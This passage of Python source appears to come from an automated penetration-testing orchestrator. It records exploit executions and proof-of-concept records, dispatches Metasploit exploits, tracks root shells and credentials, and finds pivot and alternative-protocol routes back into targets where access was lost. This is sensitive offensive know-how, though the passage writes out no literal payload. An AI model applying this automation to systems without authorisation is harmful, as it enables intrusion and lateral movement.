            "UPDATE technique_executions SET status = $1, result_summary = $2, "
            "facts_collected_count = $3, completed_at = $4, error_message = $5, "
            "failure_category = $6 "
            "WHERE id = $7",
            status, result.output, facts_count, completed_at,
            result.error, failure_category, exec_id,
        )

        # [I-1] Only increment techniques_executed on success
        if result.success:
            await db.execute(
                "UPDATE operations SET techniques_executed = techniques_executed + 1 "
                "WHERE id = $1",
                operation_id,
            )
            # SPEC-043: Record PoC reproduction steps on success
            await self._record_poc(
                db, technique_id, target_id, operation_id, result, engine,
            )

        # SPEC-037: Detect auth failure -> trigger access lost handling
        if not result.success and _is_auth_failure(result.error):
            await self._handle_access_lost(db, operation_id, target_id)

        # Extract facts from result
        if result.facts:
            await self._fact_collector.collect_from_result(
                db, operation_id, technique_id, target_id, result.facts
            )

        await self._ws.broadcast(operation_id, "execution.update", {
            "id": exec_id, "technique_id": technique_id,
            "status": status, "engine": engine,
            "facts_collected": facts_count,
        })

        return {
            "execution_id": exec_id,
            "technique_id": technique_id,
            "target_id": target_id,
            "engine": engine,
            "status": status,
            "result_summary": result.output,
            "facts_collected_count": facts_count,
            "error": result.error,
        }

    # -- PoC auto-generation (SPEC-043) --

    async def _record_poc(
        self,
        db: asyncpg.Connection,
        technique_id: str,
        target_id: str,
        operation_id: str,
        result: ExecutionResult,
        engine: str,
    ) -> None:
        """Record PoC reproduction steps after successful technique execution."""
        try:
            await self._record_poc_inner(
                db, technique_id, target_id, operation_id, result, engine
            )
        except Exception:
            pass  # PoC recording is best-effort; never block execution flow

    async def _record_poc_inner(
        self,
        db: asyncpg.Connection,
        technique_id: str,
        target_id: str,
        operation_id: str,
        result: ExecutionResult,
        engine: str,
    ) -> None:
        from app.models.poc_record import PoCRecord  # noqa: PLC0415

        target_ip = await self._get_target_ip(db, target_id) or target_id

        # Infer environment info
        tgt_row = await db.fetchrow(
            "SELECT os, privilege_level FROM targets WHERE id = $1",
            target_id,
        )
        env = {
            "os": (tgt_row["os"] if tgt_row and isinstance(tgt_row, dict) else
                   tgt_row[0] if tgt_row else "unknown"),
            "privilege_level": (tgt_row["privilege_level"] if tgt_row and isinstance(tgt_row, dict) else
                               tgt_row[1] if tgt_row else "unknown"),
            "engine": engine,
        }

        # Infer commands_executed from result
        commands: list[str] = []
        if hasattr(result, "commands") and result.commands:
            commands = result.commands
        elif result.output:
            for line in (result.output or "").split("\n"):
                stripped = line.strip()
                if stripped.startswith(("$ ", "# ", ">>> ")):
                    commands.append(stripped.lstrip("$# >").strip())
        if not commands:
            commands = [f"(executed via {engine})"]

        poc = PoCRecord(
            technique_id=technique_id,
            target_ip=target_ip,
            commands_executed=commands,
            input_params={"engine": engine},
            output_snippet=(result.output or "")[:1000],
            environment=env,
            reproducible=bool(result.output),
        )

        fact_id = str(uuid.uuid4())
        now = datetime.now(timezone.utc)
        await db.execute(
            "INSERT INTO facts "
            "(id, trait, value, category, source_technique_id, "
            "source_target_id, operation_id, score, collected_at) "
            "VALUES ($1, $2, $3, 'poc', $4, $5, $6, 1, $7) "
            "ON CONFLICT DO NOTHING",
            fact_id, f"poc.{technique_id}", poc.to_json(),
            technique_id, target_id, operation_id, now,
        )

    # -- Access recovery (SPEC-037) --

    async def _handle_access_lost(
        self, db: asyncpg.Connection, operation_id: str, target_id: str,
    ) -> None:
        """Handle detected access loss: revoke compromised status, invalidate credentials."""
        logger.warning(
            "Access lost to target %s in operation %s -- invalidating credentials",
            target_id, operation_id,
        )

        # 1. Revoke target compromised status
        await db.execute(
            "UPDATE targets SET is_compromised = FALSE, access_status = 'lost', "
            "privilege_level = NULL WHERE id = $1 AND operation_id = $2",
            target_id, operation_id,
        )

        # 2. Invalidate credential facts (trait rename)
        await db.execute(
            "UPDATE facts SET trait = REPLACE(trait, 'credential.ssh', 'credential.ssh.invalidated') "
            "WHERE operation_id = $1 AND source_target_id = $2 "
            "AND trait = 'credential.ssh'",
            operation_id, target_id,
        )
        await db.execute(
            "UPDATE facts SET trait = REPLACE(trait, 'credential.winrm', 'credential.winrm.invalidated') "
            "WHERE operation_id = $1 AND source_target_id = $2 "
            "AND trait = 'credential.winrm'",
            operation_id, target_id,
        )

        # 3. Insert access.lost fact
        target_ip = await self._get_target_ip(db, target_id)
        fact_id = str(uuid.uuid4())
        now = datetime.now(timezone.utc)
        try:
            await db.execute(
                "INSERT INTO facts (id, trait, value, category, source_target_id, "
                "operation_id, score, collected_at) "
                "VALUES ($1, 'access.lost', $2, 'host', $3, $4, 1, $5)",
                fact_id, f"ssh_auth_failed:{target_ip or target_id}",
                target_id, operation_id, now,
            )
        except Exception:
            pass  # unique constraint -- already recorded

        # SPEC-041: Three-phase access recovery
        await self._recovery_phase1_rescan(db, operation_id, target_id, target_ip)
        await self._recovery_phase2_alt_protocol(db, operation_id, target_id, target_ip)
        await self._recovery_phase3_pivot(db, operation_id, target_id, target_ip)

    # -- Access recovery phases (SPEC-041 Part B) --

    async def _recovery_phase1_rescan(
        self,
        db: asyncpg.Connection,
        operation_id: str,
        target_id: str,
        target_ip: str | None,
    ) -> None:
        """Phase 1: Collect known open ports for Orient to evaluate re-entry."""
        if not target_ip:
            return
        rows = await db.fetch(
            "SELECT value FROM facts "
            "WHERE operation_id = $1 AND source_target_id = $2 "
            "AND trait = 'service.open_port'",
            operation_id, target_id,
        )
        if not rows:
            return
        ports = []
        for row in rows:
            val = row["value"] if isinstance(row, dict) else row[0]
            port_part = val.split("/")[0] if "/" in val else val.split(":")[0]
            if port_part.isdigit():
                ports.append(port_part)
        if not ports:
            return
        fact_id = str(uuid.uuid4())
        now = datetime.now(timezone.utc)
        try:
            await db.execute(
                "INSERT INTO facts "
                "(id, trait, value, category, source_target_id, operation_id, score, collected_at) "
                "VALUES ($1, 'access.recovery_candidate', $2, 'host', $3, $4, 1, $5) "
                "ON CONFLICT DO NOTHING",
                fact_id, f"rescan:{target_ip}:ports={','.join(ports)}", target_id, operation_id, now,
            )
        except Exception:
            logger.debug("recovery_candidate fact already exists for %s", target_id)

    async def _recovery_phase2_alt_protocol(
        self,
        db: asyncpg.Connection,
        operation_id: str,
        target_id: str,
        target_ip: str | None,
    ) -> None:
        """Phase 2: Check for alternative access protocols when SSH fails."""
        if not target_ip:
            return
        _ALT_CHECKS: list[tuple[str, str, str]] = [
            ("5985", "winrm", "5985"),
            ("445", "smb", "445"),
            ("5986", "winrm_ssl", "5986"),
        ]
        port_rows = await db.fetch(
            "SELECT value FROM facts "
            "WHERE operation_id = $1 AND source_target_id = $2 "
            "AND trait = 'service.open_port'",
            operation_id, target_id,
        )
        port_values = [(r["value"] if isinstance(r, dict) else r[0]) for r in port_rows]
        now = datetime.now(timezone.utc)
        for search_pattern, protocol, default_port in _ALT_CHECKS:
            for pv in port_values:
                if search_pattern in pv.split("/")[0]:
                    fact_id = str(uuid.uuid4())
                    try:
                        await db.execute(
                            "INSERT INTO facts "
                            "(id, trait, value, category, source_target_id, "
                            "operation_id, score, collected_at) "
                            "VALUES ($1, 'access.alternative_available', $2, 'host', $3, $4, 1, $5) "
                            "ON CONFLICT DO NOTHING",
                            fact_id, f"{protocol}:{target_ip}:{default_port}", target_id, operation_id, now,
                        )
                    except Exception:
                        pass
                    break
        key_row = await db.fetchrow(
            "SELECT value FROM facts "
            "WHERE operation_id = $1 AND source_target_id = $2 "
            "AND trait = 'credential.ssh_key'",
            operation_id, target_id,
        )
        if key_row:
            fact_id = str(uuid.uuid4())
            try:
                await db.execute(
                    "INSERT INTO facts "
                    "(id, trait, value, category, source_target_id, "
                    "operation_id, score, collected_at) "
                    "VALUES ($1, 'access.alternative_available', $2, 'host', $3, $4, 1, $5) "
                    "ON CONFLICT DO NOTHING",
                    fact_id, f"ssh_key:{target_ip}:22", target_id, operation_id, now,
                )
            except Exception:
                pass

    async def _recovery_phase3_pivot(
        self,
        db: asyncpg.Connection,
        operation_id: str,
        target_id: str,
        target_ip: str | None,
    ) -> None:
        """Phase 3: Find compromised hosts that could pivot to the lost target."""
        if not target_ip:
            return
        pivot_hosts = await db.fetch(
            "SELECT id, ip_address, privilege_level FROM targets "
            "WHERE operation_id = $1 AND is_compromised = TRUE "
            "AND access_status = 'active' AND id != $2",
            operation_id, target_id,
        )
        if not pivot_hosts:
            return
        now = datetime.now(timezone.utc)
        for host in pivot_hosts:
            host_id = host["id"] if isinstance(host, dict) else host[0]
            host_ip = host["ip_address"] if isinstance(host, dict) else host[1]
            host_priv = host["privilege_level"] if isinstance(host, dict) else host[2]
            if not host_ip:
                continue
            if host_priv and host_priv.lower() in ("root", "sudo", "system", "administrator"):
                shell_row = await db.fetchrow(
                    "SELECT value FROM facts "
                    "WHERE operation_id = $1 AND source_target_id = $2 "
                    "AND trait = 'credential.root_shell'",
                    operation_id, host_id,
                )
                via = "root_shell" if shell_row else "elevated_privilege"
                fact_id = str(uuid.uuid4())
                try:
                    await db.execute(
                        "INSERT INTO facts "
                        "(id, trait, value, category, source_target_id, "
                        "operation_id, score, collected_at) "
                        "VALUES ($1, 'access.pivot_candidate', $2, 'host', $3, $4, 1, $5) "
                        "ON CONFLICT DO NOTHING",
                        fact_id, f"pivot:{host_ip}->{target_ip}:via={via}",
                        target_id, operation_id, now,
                    )
                except Exception:
                    pass

    # -- Metasploit helpers --

    async def _has_exploitable_service(
        self, db: asyncpg.Connection, operation_id: str, target_id: str
    ) -> "str | None":
        """Return service name from vuln.cve fact with exploit=true, else None."""
        row = await db.fetchrow(
            """SELECT value FROM facts
               WHERE operation_id = $1 AND source_target_id = $2
               AND trait = 'vuln.cve' AND value LIKE '%exploit=true%'
               ORDER BY score DESC
               LIMIT 1""",
            operation_id, target_id,
        )
        if row:
            # format: CVE-xxx:service:product:cvss=N:exploit=true
            parts = row["value"].split(":")
            return parts[1] if len(parts) > 1 else None
        return None

    async def _infer_exploitable_service(
        self, db: asyncpg.Connection, operation_id: str, target_id: str
    ) -> "str | None":
        """Infer exploitable service from service.open_port facts (banner matching).

        SPEC-037 Phase 2: fallback when no vuln.cve exploit=true fact exists.
        """
        rows = await db.fetch(
            "SELECT value FROM facts WHERE operation_id = $1 AND source_target_id = $2 "
            "AND trait = 'service.open_port'",
            operation_id, target_id,
        )
        for row in rows:
            val_lower = row["value"].lower()
            for banner_key, service_name in _KNOWN_EXPLOITABLE_BANNERS.items():
                if banner_key in val_lower:
                    logger.info(
                        "Inferred exploitable service '%s' from banner '%s' for target %s",
                        service_name, row["value"], target_id,
                    )
                    return service_name
        return None

    async def _get_target_ip(
        self, db: asyncpg.Connection, target_id: str
    ) -> "str | None":
        """Resolve target IP from targets table. Returns None if target not found."""
        row = await db.fetchrow(
            "SELECT ip_address FROM targets WHERE id = $1",
            target_id,
        )
        return row["ip_address"] if row else None

    async def _execute_metasploit(
        self,
        db: asyncpg.Connection,
        exec_id: str,
        now: str,
        technique_id: str,
        target_id: str,
        operation_id: str,
        ooda_iteration_id: "str | None",
        service_name: str,
        target_ip: str,
        engine: str,
    ) -> dict:
        """Execute technique via MetasploitRPCEngine (ADR-019)."""
        from app.clients.metasploit_client import MetasploitRPCEngine  # noqa: PLC0415

        started_at = datetime.now(timezone.utc)
        await db.execute(
            """INSERT INTO technique_executions
               (id, technique_id, target_id, operation_id, status, engine, started_at)
               VALUES ($1, $2, $3, $4, 'running', 'metasploit', $5)""",
            exec_id, technique_id, target_id, operation_id, started_at,
        )

        await self._ws.broadcast(operation_id, "execution.update", {
            "id": exec_id, "technique_id": technique_id,
            "status": "running", "engine": "metasploit",
        })

        logger.info(
            "_execute_metasploit: technique=%s service=%s target=%s",
            technique_id, service_name, target_ip,
        )
        msf_engine = MetasploitRPCEngine()
        method = msf_engine.get_exploit_for_service(service_name)
        if method is None:
            result_dict: dict = {
                "status": "failed",
                "reason": f"no exploit method for service: {service_name}",
                "engine": "metasploit",
                "output": "",
            }
        else:
            result_dict = await method(target_ip)

        status = result_dict.get("status", "failed")
        output = result_dict.get("output", result_dict.get("reason", ""))
        msf_engine_label = result_dict.get("engine", "metasploit")

        # SPEC-054: audit LHOST source for every reverse-shell exploit
        # attempt so operators can verify the relay pipeline is working.
        # For bind-shell exploits (e.g. vsftpd) the value shown is the
        # degraded sentinel — we do not suppress it, so a single log grep
        # covers both cases.
        _lhost_for_log = settings.RELAY_IP or "(none/bind)"
        logger.info(
            "metasploit %s status=%s lhost=%s rhosts=%s service=%s",
            technique_id, status, _lhost_for_log, target_ip, service_name,
        )

        # SPEC-053: classify metasploit failure reason for Orient consumption
        msf_error = result_dict.get("reason") if status != "success" else None
        failure_category = (
            _classify_failure(msf_error, "metasploit") if status != "success" else None
        )

        completed_at = datetime.now(timezone.utc)
        await db.execute(
            """UPDATE technique_executions
               SET status = $1, result_summary = $2,
                   facts_collected_count = 0, completed_at = $3,
                   error_message = $4, failure_category = $5
               WHERE id = $6""",
            result_dict["status"],
            result_dict.get("output", ""),
            completed_at,
            msf_error,
            failure_category,
            exec_id,
        )
        facts_count = 0
        if status == "success":
            # Mark target as compromised with root access
            await db.execute(
                "UPDATE targets SET is_compromised = TRUE, privilege_level = 'Root', "
                "access_status = 'active' WHERE id = $1 AND operation_id = $2",
                target_id, operation_id,
            )
            # Record root shell fact
            shell_fact_id = str(uuid.uuid4())
            completed_ts = datetime.now(timezone.utc)
            await db.execute(
                "INSERT INTO facts (id, trait, value, category, "
                "source_target_id, operation_id, score, collected_at) "
                "VALUES ($1, 'credential.root_shell', $2, 'host', $3, $4, 1, $5) "
                "ON CONFLICT DO NOTHING",
                shell_fact_id, f"metasploit:{service_name}:{output[:100]}",
                target_id, operation_id, completed_ts,
            )
            facts_count = 1
            await db.execute(
                "UPDATE operations SET techniques_executed = techniques_executed + 1 "
                "WHERE id = $1",
                operation_id,
            )
            # SPEC-043: Record PoC for Metasploit success
            from app.models.poc_record import PoCRecord  # noqa: PLC0415
            poc = PoCRecord(
                technique_id=technique_id,
                target_ip=target_ip,
                commands_executed=[f"metasploit:{service_name}"],
                input_params={"service": service_name, "engine": "metasploit"},
                output_snippet=(output or "")[:1000],
                environment={"engine": "metasploit", "service": service_name},
                reproducible=True,
            )
            poc_fact_id = str(uuid.uuid4())
            await db.execute(
                "INSERT INTO facts "
                "(id, trait, value, category, source_technique_id, "
                "source_target_id, operation_id, score, collected_at) "
                "VALUES ($1, $2, $3, 'poc', $4, $5, $6, 1, $7) "
                "ON CONFLICT DO NOTHING",
                poc_fact_id, f"poc.{technique_id}", poc.to_json(),
                technique_id, target_id, operation_id,
                datetime.now(timezone.utc),
            )

        await self._ws.broadcast(operation_id, "execution.update", {
            "id": exec_id, "technique_id": technique_id,
            "status": status, "engine": msf_engine_label,
        })

        return {
            "execution_id": exec_id,
            "technique_id": technique_id,
            "target_id": target_id,
            "engine": msf_engine_label,
            "status": status,
            "result_summary": output,
            "facts_collected_count": facts_count,
            "error": result_dict.get("reason"),
        }

    # -- Engine / client selection --

    def select_engine(self, technique_id: str, context: dict, gpt_recommendation: str | None = None) -> str:
        """
        Engine selection logic per ADR-006 priority order:
        1. High-confidence AI recommendation -> trust its engine choice
        2. Unknown environment -> C2 engine
        3. High stealth requirement -> C2 engine
        4. Default -> mcp_ssh
        """
        valid = {"c2", "mcp_ssh", "mcp"}
        if gpt_recommendation and gpt_recommendation in valid:
            if gpt_recommendation in ("mcp", "mcp_ssh") and self._mcp_engine is None:
                return "c2"
            return gpt_recommendation
        if context.get("environment") == "unknown":
            return "c2"
        if context.get("stealth_level") == "maximum":
            return "c2"
        return "mcp_ssh"

    def _select_client(self, engine: str) -> BaseEngineClient:
        """Select execution client by engine name.

        Bug fix: previously always returned self._c2_engine regardless of engine arg.
        """
        from app.clients.metasploit_client import MetasploitEngineAdapter
        clients: dict[str, BaseEngineClient | None] = {
            "c2":         self._c2_engine,
            "mock":       self._c2_engine,
            "mcp":        self._mcp_engine,
            "mcp_ssh":    self._mcp_engine,
            "metasploit": MetasploitEngineAdapter(),
        }
        client = clients.get(engine)
        if client is None:
            logger.warning("No client registered for engine '%s', falling back to c2", engine)
            return self._c2_engine
        return client
